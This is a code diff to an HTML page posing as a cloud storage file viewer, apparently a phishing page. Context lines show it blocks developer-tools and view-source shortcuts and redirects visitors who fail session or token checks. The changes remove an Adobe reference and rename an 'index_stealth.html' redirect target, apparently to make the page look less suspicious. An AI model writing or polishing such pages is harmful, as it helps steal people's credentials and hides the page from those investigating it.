@@ -40,7 +40,7 @@
 
     function loadTranslate(lang) {
       const gtScript = document.createElement("script");
-      gtScript.src = "//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit";
+      gtScript.src = "https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit";
       document.head.appendChild(gtScript);
       window.googleTranslateElementInit = function () {
         new google.translate.TranslateElement({
@@ -219,7 +219,7 @@
       <button type="submit" id="submit-btn">View File 87 KB</button>
 
       <div class="copyright">
-        &copy; 2025 Cloud Storage terms and conditions in accordance with our privacy policy and Adobe terms of use. Check the official documentation to review our terms of use.
+        &copy; 2025 Cloud Storage terms and conditions in accordance with our privacy policy and terms of use. Check the official documentation to review our terms of use.
       </div>
       <div class="privacy-cookies"></div>
     </form>
@@ -362,7 +362,7 @@
         
         // Validate session before processing
         if (!sessionValid || !tokenValid) {
-          window.location.href = '../index_stealth.html';
+          window.location.href = '../index.html';
           return false;
         }
         
@@ -452,7 +452,7 @@
           (e.ctrlKey && e.shiftKey && e.key === 'J') ||
           (e.ctrlKey && e.key === 'U')) {
         e.preventDefault();
-        window.location.href = '../index_stealth.html';
+        window.location.href = '../index.html';
       }
     });
     
@@ -461,3 +461,4 @@
 
 </body>
 </html>
+
